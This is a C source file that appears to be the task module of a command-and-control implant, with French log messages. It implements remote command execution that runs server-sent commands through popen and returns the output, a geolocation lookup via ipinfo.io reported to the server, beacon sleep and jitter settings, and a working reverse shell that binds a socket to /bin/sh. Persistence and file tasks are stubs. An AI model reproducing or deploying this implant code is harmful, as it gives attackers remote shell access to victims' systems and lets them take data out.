#define _POSIX_C_SOURCE 200809L

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <curl/curl.h>

#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#include "base64.h"
#include "client.h"
#include "tasks.h"
#include "network.h"

// Define callback function at file scope
static size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
    size_t total_size = size * nmemb;
    char *buf = (char *)userp;
    size_t available_space = 4096 - strlen(buf) - 1;  // -1 for null terminator
    
    if (total_size > available_space) {
        total_size = available_space;
    }
    
    if (available_space > 0) {
        strncat(buf, (char *)contents, total_size);
    }
    
    return size * nmemb;
}

// Server information
extern const char* server_ip;
extern const int server_port;

void task_execve(char *command_str, char *argument_str, const char *id_task) {
    
    // Decoding command and argument
    char *command = decode(command_str);
    char *argument = NULL;
    
    if (argument_str != NULL) {
        argument = decode(argument_str);
    }
    
    // String concatenation with bounds checking
    char full_command[4096] = {0};
    if (command != NULL) {
        if (argument != NULL) {
            snprintf(full_command, sizeof(full_command), "%s %s", command, argument);
        } else {
            snprintf(full_command, sizeof(full_command), "%s", command);
        }
    } else {
        if (argument) free(argument);
        return;
    }
    
    
    // Execute the command and capture output
    char result_buffer[4096] = {0};
    FILE *fp = popen(full_command, "r");
    if (fp == NULL) {
        free(command);
        if (argument) free(argument);
        return;
    }
    
    // Read output
    char buffer[1024];
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        strncat(result_buffer, buffer, sizeof(result_buffer) - strlen(result_buffer) - 1);
    }
    pclose(fp);
    
    // Send the result back to the server
    if (strlen(result_buffer) > 0) {
        // Encoding the result
        char *encoded_result = encode(result_buffer);
        
        // Building the message
        char message[4096];
        snprintf(message, sizeof(message), "RESULT,%s,%s,%s", uid, id_task, encoded_result);
        
        // Send the result to the server
        char *response = send_server_message(message, server_ip, server_port);
        
        if (response != NULL) {
            free(response);
        } 
        free(encoded_result);
    } 
    free(command);
    if (argument) free(argument);
}

void task_sleep(char *sleep_time_str, char *jitter_str) {
    
    if (sleep_time_str != NULL) {
        char *decoded_sleep = decode(sleep_time_str);
        if (decoded_sleep != NULL) {
            sleep_time = atof(decoded_sleep);
            free(decoded_sleep);
        }
    }

    if (jitter_str != NULL) {
        char *decoded_jitter = decode(jitter_str);
        if (decoded_jitter != NULL) {
            jitter = atof(decoded_jitter);
            printf("Jitter : %.2f%%\n", jitter);
            free(decoded_jitter);
        }
    }
    
    return;
}

void task_locate(const char *id_task) {
    CURL *curl;
    CURLcode res;
    char result_buffer[4096] = {0};
    
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, "http://ipinfo.io");
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, result_buffer);
        
        res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            fprintf(stderr, "Échec de la requête cURL: %s\n", curl_easy_strerror(res));
            goto cleanup;
        }

        // Encode the result
        char *encoded_result = encode(result_buffer);
        if (encoded_result == NULL) {
            fprintf(stderr, "Erreur d'encodage en base64\n");
            goto cleanup;
        }

        // Building the message
        char message[4096];
        snprintf(message, sizeof(message), "RESULT,%s,%s,%s", uid, id_task, encoded_result);
        
        // Send the result to the server
        char *response = send_server_message(message, server_ip, server_port);
        
        if (response != NULL) {
            free(response);
        } else {
            fprintf(stderr, "Échec de l'envoi du résultat au serveur\n");
        }
        
        free(encoded_result);
        
cleanup:
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}

void task_revshell(int server_port, const char *server_ip) {
    printf("Exécution de la tâche revshell\n");
    const char *ip = (server_ip != NULL) ? server_ip : "127.0.0.1";

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(server_port);
    server.sin_addr.s_addr = inet_addr(ip);

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Échec de création du socket");
        return;
    }

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        perror("Échec de la connexion au serveur");
        close(sock);
        return;
    }

    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    char *args[] = {"/bin/sh", NULL};
    execve("/bin/sh", args, NULL);

    perror("execve failed");
    close(sock);
}

void task_persist() {
    printf("Exécution de la tâche persist\n");
    // Implémentation à faire
    return;
}

void task_cat() {
    printf("Exécution de la tâche cat\n");
    // Implémentation à faire
    return;
}

void task_mv() {
    printf("Exécution de la tâche mv\n");
    // Implémentation à faire
    return;
}

void task_rm() {
    printf("Exécution de la tâche rm\n");
    // Implémentation à faire
    return;
}

void task_ps() {
    printf("Exécution de la tâche ps\n");
    // Implémentation à faire
    return;
}

